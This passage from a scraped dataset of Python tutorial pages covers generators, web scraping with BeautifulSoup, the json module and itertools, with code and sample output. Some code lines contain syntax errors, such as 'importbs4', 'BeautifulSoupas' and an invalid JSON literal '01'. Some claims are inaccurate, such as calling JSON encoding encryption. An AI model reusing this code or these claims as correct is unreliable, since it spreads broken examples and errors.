'if(i%2==0):', 'yield i', '#Successive Function call using for loop', 'for i in simple():', 'print(i)', 'def multiple_yield():', 'str1 = ""First String""', 'yield str1', 'str2 = ""Second string""', 'yield str2', 'str3 = ""Third String""', 'yield str3', 'obj = multiple_yield()', 'print(next(obj))', 'print(next(obj))', 'print(next(obj))', 'list = [1,2,3,4,5,6,7]', '# List Comprehension', 'z = [x**3 for x in list]', '# Generator expression', 'a = (x**3 for x in list)', 'print(a)', 'print(z)', 'list = [1,2,3,4,5,6]', 'z = (x**3 for x in list)', 'print(next(z))', 'print(next(z))', 'print(next(z))', 'print(next(z))', 'def table(n):', 'for i in range(1,11):', 'yield n*i', 'i = i+1', 'for i in table(15):', 'print(i)', 'import sys', '# List comprehension', 'nums_squared_list = [i * 2 for i in range(1000)]', 'print(sys.getsizeof(""Memory in Bytes:""nums_squared_list))', '# Generator Expression', 'nums_squared_gc = (i ** 2 for i in range(1000))', 'print(sys.getsizeof(""Memory in Bytes:"", nums_squared_gc))', ""with open('sells.log') as file:"", ""burger_col = (line[3] for line in file)  per_hour = (int(x) for x in burger_col if x != 'N/A')"", 'print(""Total burgers sold = "",sum(per_hour))', 'def infinite_sequence():', 'num = 0', 'while True:', 'yield num', 'num += 1', 'for i in infinite_sequence():', 'print(i)']","['0', '2', '4', '6', '8', 'First String', 'Second string', 'Third String', '<generator object <genexpr> at 0x01BA3CD8>', '[1, 8, 27, 64, 125, 216, 343]', '1', '8', '27', '64', '15', '30', '45', '60', '75', '90', '105', '120', '135', '150', 'Memory in Bytes: 4508', 'Memory in Bytes: 56', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '.........', '..........', '315', '316', '317', 'Traceback (most recent call last):', 'File ""C:\\Users\\DEVANSH SHARMA\\Desktop\\generator.py"", line 33, in <module>', 'print(i)', 'KeyboardInterrupt']",[],"['|||Normal function contains only one Lreturn statement whereas generator function can contain one or more yield statement.|||When the generator functions are called, the normal function is paused immediately and control transferred to the caller.|||Local variable and their states are remembered between successive calls.|||StopIteration exception is raised automatically when the function terminates.|||']"
54,['Web Scraping Using Python'],"['Web Scraping is a technique to extract a large amount of data from several websites. The term ""scraping"" refers to obtaining the information from another source (webpages) and saving it into a local file. For example: Suppose you are working on a project called ""Phone comparing website,"" where you require the price of mobile phones, ratings, and model names to make comparisons between the different mobile phones. If you collect these details by checking various sites, it will take much time. In that case, web scrapping plays an important role where by writing a few lines of code you can get the desired results.']","['https://www.javatpoint.com/python-json', 'https://www.javatpoint.com/python-generators', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/html-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/xml-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/json-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/', 'https://www.javatpoint.com/python-json', 'https://www.javatpoint.com/python-generators', 'https://www.javatpoint.com/python-json']","['https://static.javatpoint.com/python/images/web-scraping-using-python.png', 'https://static.javatpoint.com/python/images/web-scraping-using-python2.png', 'https://static.javatpoint.com/python/images/web-scraping-using-python3.png', 'https://static.javatpoint.com/python/images/web-scraping-using-python4.png', 'https://static.javatpoint.com/python/images/web-scraping-using-python5.png', 'https://static.javatpoint.com/python/images/web-scraping-using-python6.png', 'https://static.javatpoint.com/python/images/web-scraping-using-python7.png', 'https://static.javatpoint.com/python/images/web-scraping-using-python8.png']",[],"['What is Web Scraping?', 'Is Web Scrapping legal?', 'Why Web Scrapping?', 'Why use Python for Web Scrapping?']","['The basics of web scraping', 'How does Web Scrapping work?', 'Getting Started with Web Scrapping ', 'Web Scrapping Example:', 'Demo: Scraping Data from Flipkart Website']",['Note - It is good to use the PyCharm IDE.'],"['There are several tools available to scrap data from websites, such as:', 'Many companies use personals e-mail data for email marketing. They can target the specific audience for their marketing.', ""These are the following steps to perform web scraping. Let's understand the working of web scraping. "", 'Step -1: Find the URL that you want to scrape', 'Step - 2: Inspecting the Page', 'Step - 3: Write the code', 'Write a code to extract the information, provide relevant information, and run the code.', 'Step - 4: Store the data in the file', 'Store that information in required csv, xml, JSON file format.', 'Library used for web scrapping', 'Pandas library is used for data manipulation and analysis. It is used to extract the data and store it in the desired format.', ""Let's understand the BeautifulSoup library in detail."", 'Installation of BeautifulSoup', 'You can install BeautifulSoup by typing the following command:', 'Installing a parser', 'We recommend you to install html5lib parser because it is much suitable for the newer version of Python, or you can install lxml parser.', 'Type the following command in your terminal:', 'A Tag object corresponds to an XML or HTML original document.', 'Tag contains lot of attributes and methods, but most important features of a tag are name and attribute.', 'Every tag has a name, accessible as .name:', ""We can add, remove, and modify a tag's attributes. It can be done by using tag as dictionary."", 'A string in BeautifulSoup refers text within a tag. BeautifulSoup uses the NavigableString class to contain these bits of text.', ""A string is immutable means it can't be edited. But it can be replaced with another string using replace_with()."", 'In some cases, if you want to use a NavigableString outside the BeautifulSoup, the unicode() helps it to turn into normal Python Unicode string.', ""Let's take an example to understand the scrapping practically by extracting the data from the webpage and inspecting the whole page."", 'Webpage of Wikipedia Learning', 'Here we will scrap the webpage of given link (https://www.javatpoint.com/). Consider the following code:', 'The above code will display the all html code of javatpoint homepage.', ""Using the BeautifulSoup object, i.e. soup, we can collect the required data table. Let's print some interesting information using the soup object:"", 'Output: It will give an output as follow:', 'Output: It will give an output as follow:', 'Output: It will print all links along with its attributes. Here we display a few of them:', 'Prerequisites:', 'Step - 1: Find the desired URL to scrap ', 'Step -2: Inspecting the page', 'Step - 3: Find the data for extracting', 'Extract the Price, Name, and Rating, which are contained in the ""div"" tag, respectively.', 'Step - 4: Write the Code']","['Web Scrapping extracts the data from websites in the unstructured format. It helps to collect these unstructured data and convert it in a structured form.', 'Startups prefer web scrapping because it is a cheap and effective way to get a large amount of data without any partnership with the data selling company.', 'Here the question arises whether the web scrapping is legal or not. The answer is that some sites allow it when used legally. Web scraping is just a tool you can use it in the right way or wrong way.', 'Web scrapping is illegal if someone tries to scrap the nonpublic data. Nonpublic data is not reachable to everyone; if you try to extract such data then it is a violation of the legal term.', ""As we have discussed above, web scrapping is used to extract the data from websites. But we should know how to use that raw data. That raw data can be used in various fields. Let's have a look at the usage of web scrapping:"", 'Web Scrapping plays an essential role in extracting data from social media websites such as Twitter, Facebook, and Instagram, to find the trending topics.', 'The large set of data such as general information, statistics, and temperature is scrapped from websites, which is analyzed and used to carry out surveys or research and development.', ""There are other popular programming languages, but why we choose the Python over other programming languages for web scraping? Below we are describing a list of Python's features that make the most useful programming language for web scrapping."", ""In Python, we don't need to define data types for variables; we can directly use the variable wherever it requires. It saves time and makes a task faster. Python defines its classes to identify the data type of variable."", ""The purpose of the web scrapping is to save time. But what if you spend more time in writing the code? That's why we use Python, as it can perform a task in a few lines of code."", 'Python is open-source, which means it is freely available for everyone. It has one of the biggest communities across the world where you can seek help if you get stuck anywhere in Python code.', ' A web crawler is generally called a ""spider."" It is an artificial intelligence technology that browses the internet to index and searches for the content by given links. It searches for the relevant information asked by the programmer.', 'A web scraper is a dedicated tool that is designed to extract the data from several websites quickly and effectively. Web scrappers vary widely in design and complexity, depending on the projects.', 'The data is extracted in raw HTML format, which must be carefully parsed and reduce the noise from the raw data. In some cases, data can be simple as name and address or as complex as high dimensional weather and stock market data.', ""Python has a vast collection of libraries and also provides a very useful library for web scrapping. Let's understand the required library for Python."", ""BeautifulSoup supports HTML parser and several third-party Python parsers. You can install any of them according to your dependency. The list of BeautifulSoup's parsers is the following:"", 'BeautifulSoup is used to transform a complex HTML document into a complex tree of Python objects. But there are a few essential types object which are mostly used:', 'A tag may have any number of attributes. The tag <b id = ""boldest""> has an attribute ""id"" whose value is ""boldest"". We can access a tag\'s attributes by treating the tag as dictionary.', 'In HTML5, there are some attributes that can have multiple values. The class (consists more than one css) is the most common multivalued attributes. Other attributes are rel, rev, accept-charset, headers, and accesskey.', 'The BeautifulSoup object represents the complete parsed document as a whole. In many cases, we can use it as a Tag object. It means it supports most of the methods described in navigating the tree and searching the tree.', 'First, open your favorite page on Wikipedia and inspect the whole page, and before extracting data from the webpage, you should ensure your requirement. Consider the following code:', 'In the following lines of code, we are extracting all headings of a webpage by class name. Here front-end knowledge plays an essential role in inspecting the webpage.', 'In the above code, we imported the bs4 and requested the library. In the third line, we created a res object to send a request to the webpage. As you can observe that we have extracted all heading from the webpage.', 'Let\'s understand another example; we will make a GET request to the URL and create a parse Tree object (soup) with the use of BeautifulSoup and Python built-in ""html5lib"" parser.', 'In this example, we will scrap the mobile phone prices, ratings, and model name from Flipkart, which is one of the popular e-commerce websites. Following are the prerequisites to accomplish this task:', 'It is necessary to inspect the page carefully because the data is usually contained within the tags. So we need to inspect to select the desired tag. To inspect the page, right-click on the element and click ""inspect"".', 'We scrapped the details of the iPhone and saved those details in the CSV file as you can see in the output. In the above code, we put a comment on the few lines of code for testing purpose. You can remove those comments and observe the output.', 'In this tutorial, we have discussed all basic concepts of web scrapping and described the sample scrapping from the leading online ecommerce site flipkart.']","['It is widely used to collect data from several online shopping sites and compare the prices of products and make profitable pricing decisions. Price monitoring using web scrapped data gives the ability to the companies to know the market condition and facilitate dynamic pricing. It ensures the companies they always outrank others.', 'eb Scrapping is perfectly appropriate for market trend analysis. It is gaining insights into a particular market. The large organization requires a great deal of data, and web scrapping provides the data with a guaranteed level of reliability and accuracy.', 'A single news cycle can create an outstanding effect or a genuine threat to your business. If your company depends on the news analysis of an organization, it frequently appears in the news. So web scraping provides the ultimate solution to monitoring and parsing the most critical stories. News articles and social media platform can directly influence the stock market.', 'Python comes with an extensive range of libraries such as NumPy, Matplotlib, Pandas, Scipy, etc., that provide flexibility to work with various purposes. It is suited for almost every emerging field and also for web scrapping for extracting data and do manipulation.', ""The web scrapping consists of two parts: a web crawler and a web scraper. In simple words, the web crawler is a horse, and the scrapper is the chariot. The crawler leads the scrapper and extracts the requested data. Let's understand about these two components of web scrapping:"", ""First, you should understand the requirement of data according to your project. A webpage or website contains a large amount of information. That's why scrap only relevant information. In simple words, the developer should be familiar with the data requirement."", 'The initial step is to find the URL that you want to scrap. Here we are extracting mobile phone details from the flipkart. The URL of this page is https://www.flipkart.com/search?q=iphones&otracker=search&otracker1=search&marketplace=FLIPKART&as-show=on&as=off.']","['pip install selenium', 'pip install bs4', 'pip install html5lib', 'soup = bs4.BeautifulSoup(""<b class = ""boldest"">Extremely bold</b>)', 'tag = soup.b', 'type(tag)', 'tag.name', 'tag[id]', '# add the element', ""tag['id'] = 'verybold'"", ""tag['another-attribute'] = 1"", '# delete the tag', ""del tag['id']"", ""class_is_multi= { '*' : 'class'}"", 'xml_soup = BeautifulSoup(\'<p class=""body strikeout""></p>\', \'xml\', multi_valued_attributes=class_is_multi)', ""xml_soup.p['class']"", ""# [u'body', u'strikeout']"", 'tag.string', ""# u'Extremely bold'"", 'type(tag.string)', ""# <class 'bs4.element.NavigableString'>"", 'tag.string.replace_with(""No longer bold"")', 'doc=BeautifulSoup(""<document><content/>INSERT FOOTER HERE</document"",""xml"")', 'footer=BeautifulSoup(""<footer>Here\'s the footer</footer>"",""xml"")', 'doc.find(text=""INSERT FOOTER HERE"").replace_with(footer)', 'print(doc)', '#importing the BeautifulSoup Library', 'importbs4', 'import requests', '#Creating the requests', 'res = requests.get(""https://en.wikipedia.org/wiki/Machine_learning"")', 'print(""The object type:"",type(res))', '# Convert the request object to the Beautiful Soup Object', ""soup = bs4.BeautifulSoup(res.text,'html5lib')"", 'print(""The object type:"",type(soup)', ""soup.select('.mw-headline')"", ""for i in soup.select('.mw-headline'):"", ""print(i.text,end = ',')"", 'following code:', '# importing the libraries', 'from bs4 import BeautifulSoup', 'import requests', 'url=""https://www.javatpoint.com/""', '# Make a GET request to fetch the raw HTML content', 'html_content = requests.get(url).text', '# Parse the html content', 'soup = BeautifulSoup(html_content, ""html5lib"")', 'print(soup.prettify()) # print the parsed data of html', 'print(soup.title)', 'print(soup.title.text)', 'for link in soup.find_all(""a""):', 'print(""Inner Text is: {}"".format(link.text))', 'print(""Title is: {}"".format(link.get(""title"")))', 'print(""href is: {}"".format(link.get(""href"")))', 'from bs4 import BeautifulSoupas soup', 'from urllib.request import urlopen as uReq', '# Request from the webpage', 'myurl = ""https://www.flipkart.com/search?q=iphones&otracker=search&otracker1=search&marketplace=FLIPKART&as-show=on&as=off""', 'uClient  = uReq(myurl)', 'page_html = uClient.read()', 'uClient.close()', 'page_soup = soup(page_html, features=""html.parser"")', '# print(soup.prettify(containers[0]))', '# This variable held all html of webpage', 'containers = page_soup.find_all(""div"",{""class"": ""_3O0U0u""})', '# container = containers[0]', '# # print(soup.prettify(container))', '# price = container.find_all(""div"",{""class"": ""col col-5-12 _2o7WAb""})', '# print(price[0].text)', '# ratings = container.find_all(""div"",{""class"": ""niH0FQ""})', '# print(ratings[0].text)', '# # print(len(containers))', '# print(container.div.img[""alt""])', '# Creating CSV File that will store all data', 'filename = ""product1.csv""', 'f = open(filename,""w"")', 'headers = ""Product_Name,Pricing,Ratings\\n""', 'f.write(headers)', 'for container in containers:', 'product_name = container.div.img[""alt""]', 'price_container = container.find_all(""div"", {""class"": ""col col-5-12 _2o7WAb""})', 'price = price_container[0].text.strip()', 'rating_container = container.find_all(""div"",{""class"":""niH0FQ""})', 'ratings = rating_container[0].text', '# print(""product_name:""+product_name)', '# print(""price:""+price)', '# print(""ratings:""+ str(ratings))', ""edit_price = ''.join(price.split(','))"", 'sym_rupee = edit_price.split(""?"")', 'add_rs_price = ""Rs""+sym_rupee[1]', 'split_price = add_rs_price.split(""E"")', 'final_price = split_price[0]', 'split_rating = str(ratings).split("" "")', 'final_rating = split_rating[0]', 'print(product_name.replace("","", ""|"")+"",""+final_price+"",""+final_rating+""\\n"")', 'f.write(product_name.replace("","", ""|"")+"",""+final_price+"",""+final_rating+""\\n"")', 'f.close()']","['<class ""bs4.element.Tag"">', '?xml version=""1.0"" encoding=""utf-8""?>', ""# <document><content/><footer>Here's the footer</footer></document>"", ""The object type <class 'requests.models.Response'>"", ""Convert the object into: <class 'bs4.BeautifulSoup'>"", 'Overview,Machine learning tasks,History and relationships to other fields,Relation to data mining,Relation to optimization,Relation to statistics, Theory,Approaches,Types of learning algorithms,Supervised learning,Unsupervised learning,Reinforcement learning,Self-learning,Feature learning,Sparse dictionary learning,Anomaly detection,Association rules,Models,Artificial neural networks,Decision trees,Support vector machines,Regression analysis,Bayesian networks,Genetic algorithms,Training models,Federated learning,Applications,Limitations,Bias,Model assessments,Ethics,Software,Free and open-source software,Proprietary software with free and open-source editions,Proprietary software,Journals,Conferences,See also,References,Further reading,External links,', '<title>Tutorials List - Javatpoint</title>', 'Tutorials List - Javatpoint', 'href is: https://www.facebook.com/javatpoint', 'Inner Text is:', 'The title is: None', 'href is: https://twitter.com/pagejavatpoint', 'Inner Text is:', 'The title is: None', 'href is: https://www.youtube.com/channel/UCUnYvQVCrJoFWZhKK3O2xLg', 'Inner Text is:', 'The title is: None', 'href is: https://javatpoint.blogspot.com', 'Inner Text is: Learn Java', 'Title is: None', 'href is: https://www.javatpoint.com/java-tutorial', 'Inner Text is: Learn Data Structures', 'Title is: None', 'href is: https://www.javatpoint.com/data-structure-tutorial', 'Inner Text is: Learn C Programming', 'Title is: None', 'href is: https://www.javatpoint.com/c-programming-language-tutorial', 'Inner Text is: Learn C++ Tutorial']","['Parser|||Typical usage&&&Python\'s html.parser|||BeautifulSoup(markup,""html.parser"")&&&lxml\'s HTML parser|||BeautifulSoup(markup,""lxml"")&&&lxml\'s XML parser|||BeautifulSoup(markup,""lxml-xml"")&&&Html5lib|||BeautifulSoup(markup,""html5lib"")']","[""|||Scrapping-bot|||Scrapper API|||Octoparse|||Import.io|||Webhose.io|||Dexi.io|||Outwit|||Diffbot|||Content Grabber|||Mozenda|||Web Scrapper Chrome Extension||||||Dynamic Price Monitoring||||||Market Research||||||Email Gathering||||||News and Content Monitoring||||||Social Media Scrapping||||||Research and Development||||||Dynamically Typed||||||Vast collection of libraries||||||Less Code||||||Open-Source Community||||||The crawler||||||Selenium- Selenium is an open-source automated testing library. It is used to check browser activities. To install this library, type the following command in your terminal. ||||||Pandas||||||BeautifulSoup||||||Tag||||||Name||||||Attributes||||||Multi-valued Attributes||||||NavigableString||||||BeautifulSoup object||||||Let's print the title of the web page.||||||In the above output, the HTML tag is included with the title. If you want text without tag, you can use the following code:||||||We can get the entire link on the page along with its attributes, such as href, title, and its inner Text. Consider the following code:||||||Python 2.x or Python 3.x with Selenium, BeautifulSoup, Pandas libraries installed.|||Google - chrome browser|||Scrapping Parser such as html.parser, xlml, etc.|||""]"
55,['Python JSON'],"['JSON stands for JavaScript Object Notation, which is a widely used data format for data interchange on the web. JSON is the ideal format for organizing data between a client and a server. Its syntax is similar to the JavaScript programming language. The main objective of JSON is to transmit the data between the client and the web server. It is easy to learn and the most effective way to interchange the data. It can be used with various programming languages such as Python, Perl, Java, etc.']","['https://www.javatpoint.com/python-itertools', 'https://www.javatpoint.com/web-scraping-using-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/perl-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/java-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/json-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/javascript-tutorial', 'https://www.javatpoint.com/python-itertools', 'https://www.javatpoint.com/web-scraping-using-python', 'https://www.javatpoint.com/python-itertools']",[],[],"['Working with Python JSON', 'Serializing JSON', 'Python Pretty Print JSON', 'Encoding and Decoding']","['Deserializing JSON', 'json.load() vs json.loads()', 'json.dump() vs json.dumps()']",['Note: Both dump() and dumps() functions accept indent and short_keys arguments.'],"['JSON mainly supports 6 types of data type In JavaScript:', 'JSON is built on the two structures:', 'JSON data representation is similar to the Python dictionary. Below is an example of JSON data:', 'The deserialization is the reverse process of decoding the data that is converted into the JSON format.', 'This module includes many built-in functions.', ""Let's have a look at these functions:"", 'In this section, we will learn the following methods:', 'Python objects are converted into the following JSON objects. The list is given below:', 'Writing JSON Data into File', ""Let's consider the simple serialization example:"", 'JSON supports primitive data types, such as strings and numbers, as well as nested list, tuples and objects. ', 'The load() function is used to deserialize the JSON data to Python object from the file. Consider the following example:', 'The json.load() function is used to load JSON file, whereas json.loads() function is used to load string.', 'Consider the following example:', 'Example:1 - Encoding using demjson package', 'Decoding-The demjson module provides decode() function, which is used to convert JSON object into Python format type. The syntax is given below:', 'In this tutorial, we have learned about the Python JSON. JSON is the most effective way to transmit data between the client and the web server.']","['Python provides a module called json. Python supports standard library marshal and pickle module, and JSON API behaves similarly as these library. Python natively supports JSON features.', 'The encoding of JSON data is called Serialization. Serialization is a technique where data transforms in the series of bytes and transmitted across the network.', 'Python provides a dump() function to transmit(encode) data in JSON format. It accepts two positional arguments, first is the data object to be serialized and second is the file-like object to which the bytes needs to be written.', ""In the above program, we have opened a file named data.json in writing mode. We opened this file in write mode because if the file doesn't exist, it will be created. The json.dump() method transforms dictionary into JSON string."", 'Deserialization is the process to decode the JSON data into the Python objects. The json module provides two methods load() and loads(), which are used to convert JSON data in actual Python object form. The list is given below:', 'The above table shows the inverse of the serialized table but technically it is not a perfect conversion of the JSON data. It means that if we encode the object and decode it again after sometime; we may not get the same object back.', ""Let's take real-life example, one person translates something into Chinese and another person translates back into English, and that may not be exactly translated. Consider the simple example:"", 'In the above program, we have encoded Python object in the file using dump() function. After that we read JSON file using load() function, where we have passed read_file as an argument.', 'The json module also provides loads() function, which is used to convert JSON data to Python object. It is quite similar to the load() function. Consider the following example:', 'The json.dump() function is used when we want to serialize the Python objects into JSON file and json.dumps() function is used to convert JSON data as a string for parsing and printing.', 'Sometimes we need to analyze and debug a large amount of JSON data. It can be done by passing additional arguments indent and sort_keys in json.dumps() and json.dump() methods.', 'In the above code, we have provided the 5 spaces to the indent argument and the keys are sorted in ascending order. The default value of indent is None and the default value of sort_key is False.', 'Encoding - The demjson package provides encode() function that is used to convert the Python object into a JSON string representation. The syntax is given below:']","['Serialization is the technique to convert the Python objects to JSON. Sometimes, computer need to process lots of information so it is good to store that information into the file. We can store JSON data into file using JSON function. The json module provides the dump() and dumps() method that are used to transform Python object.', ""The dumps() function is used to store serialized data in the Python file. It accepts only one argument that is Python data for serialization. The file-like argument is not used because we aren't not writing data to disk. Let's consider the following example:"", 'Encoding is the technique for transforming the text or values into an encrypted form. Encrypted data can only be used by the preferred user by decoding it. Encoding is also known as serialization and decoding is also called deserialization. Encoding and decoding are done for JSON(object) format. Python provides a popular package for such operations. We can install it on Windows by the following command:']","['""book"": [', '""id"": 01,', '""language"": ""English"",', '""edition"": ""Second"",', '""author"": ""Derrick Mwiti""', '""id"": 02,', '""language"": ""French"",', '""edition"": ""Third"",', '""author"": ""Vladimir""', 'import json', 'print(dir(json))', 'Import json', '# Key:value mapping', 'student  = {', '""Name"" : ""Peter"",', '""Roll_no"" : ""0090014"",', '""Grade"" : ""A"",', '""Age"": 20,', '""Subject"": [""Computer Graphics"", ""Discrete Mathematics"", ""Data Structure""]', 'with open(""data.json"",""w"") as write_file:', 'json.dump(student,write_file)', 'import json', '# Key:value mapping', 'student  = {', '""Name"" : ""Peter"",', '""Roll_no"" : ""0090014"",', '""Grade"" : ""A"",', '""Age"": 20', 'b = json.dumps(student)', 'print(b)', 'import json', '#Python  list conversion to JSON  Array', 'print(json.dumps([\'Welcome\', ""to"", ""javaTpoint""]))', '#Python  tuple conversion to JSON Array', 'print(json.dumps((""Welcome"", ""to"", ""javaTpoint"")))', '# Python string conversion to JSON String', 'print(json.dumps(""Hello""))', '# Python int conversion to JSON Number', 'print(json.dumps(1234))', '# Python float conversion to JSON Number', 'print(json.dumps(23.572))', '# Boolean conversion to their respective values', 'print(json.dumps(True))', 'print(json.dumps(False))', '# None value to null', 'print(json.dumps(None))', 'import json', 'a = (10,20,30,40,50,60,70)', 'print(type(a))', 'b = json.dumps(a)', 'print(type(json.loads(b)))', 'import json', '# Key:value mapping', 'student  = {', '""Name"" : ""Peter"",', '""Roll_no"" : ""0090014"",', '""Grade"" : ""A"",', '""Age"": 20,', 'with open(""data.json"",""w"") as write_file:', 'json.dump(student,write_file)', 'with open(""data.json"", ""r"") as read_file:', 'b = json.load(read_file)', 'print(b)', 'Import json', 'a = [""Mathew"",""Peter"",(10,32.9,80),{""Name"" : ""Tokyo""}]', '# Python object into JSON', 'b = json.dumps(a)', '# JSON into Python Object', 'c = json.loads(b)', 'print(c)', 'import json', 'person = \'{""Name"": ""Andrew"",""City"":""English"", ""Number"":90014, ""Age"": 23,""Subject"": [""Data Structure"",""Computer Graphics"", ""Discrete mathematics""]}\'', 'per_dict = json.loads(person)', 'print(json.dumps(per_dict, indent = 5, sort_keys= True))', 'pip install demjson', 'demjson.encode(self,obj,nest_level = 0)', 'import demjson', 'a = [{""Name"": \'Peter\',""Age"":20, ""Subject"":""Electronics""}]', 'print(demjson.encode(a))', 'Import demjson', 'a = ""[\'Peter\', \'Smith\', \'Ricky\', \'Hayden\']""', 'print(demjson.decode(a))']","[""['JSONDecodeError', 'JSONDecoder', 'JSONEncoder', '__all__', '__author__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__path__', '__spec__', '__version__', '_default_decoder', '_default_encoder', 'codecs', 'decoder', 'detect_encoding', 'dump', 'dumps', 'encoder', 'load', 'loads', 'scanner']"", '{""Name"" : ""Peter"", ""Roll_no"" : ""0090014"" , ""Grade"" : ""A"",  ""Age"" : 20, ""Subject"" : [""Computer Graphics"", ""Discrete Mathematics"", ""Data Structure""] }', '{""Name"": ""Peter"", ""Roll_no"": ""0090014"", ""Grade"": ""A"", ""Age"": 20}', '[""Welcome"", ""to"", ""javaTpoint""]', '[""Welcome"", ""to"", ""javaTpoint""]', '""Hello""', '1234', '23.572', 'true', 'false', 'null', ""<class 'tuple'>"", ""<class 'list'>"", ""{'Name': 'Peter', 'Roll_no': '0090014', 'Grade': 'A', 'Age': 20}"", ""['Mathew', 'Peter', [10, 32.9, 80], {'Name': 'Tokyo'}]"", '{', '""Age"": 23,', '""City"": ""English"",', '""Name"": ""Andrew"",', '""Number"": 90014,', '""Subject"": [', '""Data Structure"",', '""Computer Graphics"",', '""Discrete mathematics""', ']', '}', '[{""Age"":20,""Name"":""Peter"",""Subject"":""Electronics""}]', ""['Peter', 'Smith', 'Ricky', 'Hayden']""]","['Sr.|||Python Objects|||JSON &&&1.|||Dict|||Object&&&2.|||list, tuple|||Array&&&3.|||Str|||String&&&4.|||int, float|||Number&&&5.|||True|||true&&&6.|||False|||false&&&7.|||None|||null', 'SR.|||JSON|||Python&&&1.|||Object|||dict&&&2.|||Array|||list&&&3.|||String|||str&&&4.|||number(int)|||int&&&5.|||true|||True&&&6.|||false|||False&&&7.|||null|||None']","['|||String|||Number|||Boolean|||Null|||Object|||Array||||||It stores data in the name/value pairs. It is treated as an object, record, dictionary, hash table, keyed list.|||The ordered list of values is treated as an array, vector, list, or sequence.||||||load()|||loads()|||dump()|||dumps()||||||The dump() function||||||The dumps () function||||||The load() function|||']"
56,['Python Itertools'],"['Itertool is one of the most amazing Python 3 standard libraries. This library has pretty much coolest functions and nothing wrong to say that it is the gem of the Python programing language. Python provides excellent documentation of the itertools but in this tutorial, we will discuss few important and useful functions or iterators of itertools.']","['https://www.javatpoint.com/python-multiprocessing', 'https://www.javatpoint.com/python-json', 'https://www.javatpoint.com/https://www.javatpoint.com/python-zip-function', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-iter-function', 'https://www.javatpoint.com/https://www.javatpoint.com/python-zip-function', 'https://www.javatpoint.com/python-multiprocessing', 'https://www.javatpoint.com/python-json', 'https://www.javatpoint.com/python-multiprocessing']",[],[],"['Introduction', 'Types of Iterator']","['Infinite Iterators', 'Terminating Iterator']","[""Note: If you are using the zip() function and map() function that means you are already using itertools. You don't need to import it distinctly.""]","['The key thing about itertools is that the functions of this library are used to make memory-efficient and precise code.', 'The Python iter() function is used to call on the iterable and return iterator object of the iterable.', 'The Python zip() function calls iter() on each of its argument and then calls next() by combining the result into tuple.', 'There are various types of iterator in itertools module. The list is given below:', 'Example - 2: Using next() function', 'In Python, there are four types of combinatoric iterators:', 'There are different types of terminating iterator:', 'In this tutorial, we have discussed several useful iterators along with itertools. ']","['Before learning the Python itertools, you should have knowledge of the Python iterator and generators. In this article, we will describe itertools for beginners are well as for professionals.', ""In the above code, we have passed two lists [1,2,3] and ['a', 'b', 'c'] as iterable in zip() function. These lists return one element at a time. In Python, an element that implement .__iter__() or .__getitem__() method called iterable."", 'In Python, any object that can implement for loop is called iterators. Lists, tuples, set, dictionaries, strings are the example of iterators but iterator can also be infinite and this type of iterator is called infinite iterator.', 'Combinatoric iterators: The complex combinatorial constructs are simplified by the recursive generators. The permutations, combinations, and Cartesian products are the example of the combinatoric construct.', 'Terminating iterators are generally used to work on the small input sequence and generate the output based on the functionality of the method used in iterator.']","['According to the official definition of itertools, ""this module implements a number of iterator building blocks inspired by constructs from APL, Haskell, and SML."" In simple words, the number of iterators can together create \'iterator algebra\' which makes it possible to complete the complex task. The functions in itertools are used to produce more complex iterators. Let\'s take an example: Python built-in zip() function accepts any number of arguments as iterable. It iterates over tuples and return their corresponding elements. ']","['a = [1,2,3]', ""b= ['a', 'b', 'c']"", 'c = zip(a,b)', 'print(c)', ""a = iter('Hello')"", 'print(a)', 'import itertools', 'for i in itertools.count(10,5):', 'if i == 50:', 'break', 'else:', 'print(i,end="" "")', 'import itertools', 'temp = 0', 'for i in itertools.cycle(""123""):', 'if temp > 7:', 'break', 'else:', ""print(i,end=' ')"", 'temp = temp+1', 'import itertools', ""val = ['Java', 'T', 'Point']"", 'iter = itertools.cycle(val)', 'for i in range(6):', '# Using next function', 'print(next(iter), end = "" "")', 'import itertools', 'print(""Printing the number repeadtly:"")', 'print(list(itertools.repeat(40,15)))', 'from itertools import product', 'print(""We are computing cartesian product using repeat Keyword Argument:"")', 'print(list(product([1, 2], repeat=2)))', 'print()', 'print(""We are computing cartesian product of the containers:"")', ""print(list(product(['Java', 'T', 'point'], '5')))"", 'print()', 'print(""We are computing product of the containers:"")', ""print(list(product('CD', [4, 5])))"", 'from itertools import permutations', 'print(""Computing all permutation of the following list"")', 'print(list(permutations([3,""Python""],2)))', 'print()', 'print(""Permutations of following string"")', ""print(list(permutations('AB')))"", 'print()', 'print(""Permutation of the given container is:"")', 'print(list(permutations(range(4),2)))', 'from itertools import combinations', 'print(""Combination of list in sorted order(without replacement)"",list(combinations([\'B\',3],2)))', 'print()', 'print(""Combination of string in sorted order"",list(combinations(""ZX"",2)))', 'print()', 'print(""Combination of list in sorted order"",list(combinations(range(20),1)))', 'from itertools import combinations_with_replacement', 'print(""Combination of string in sorted order(with replacement) is:"")', 'print(list(combinations_with_replacement(""XY"", 3)))', 'print()', 'print(""Combination of list in sorted order(with replacement) is:"")', 'print(list(combinations_with_replacement([4, 2], 3)))', 'print()', 'print(""Combination of container in sorted order(with replacement) is:"")', 'print(list(combinations_with_replacement(range(3), 2)))', 'import itertools', 'import operator', '# initializing list 1', 'list1 = [1, 4, 5, 7, 9, 11]', '# using accumulate() that will prints the successive summation of elements', 'print(""The sum is : "", end="""")', 'print(list(itertools.accumulate(list1)))', '# using accumulate() that will prints the successive multiplication of elements', 'print(""The product is : "", end="""")', 'print(list(itertools.accumulate(list1, operator.mul)))', '# using accumulate() that will prints the successive summation of elements', 'print(""The sum is : "", end="""")', 'print(list(itertools.accumulate(list1)))', '# using accumulate() that will prints the successive multiplication of elements', 'print(""The product is : "", end="""")', 'print(list(itertools.accumulate(list1, 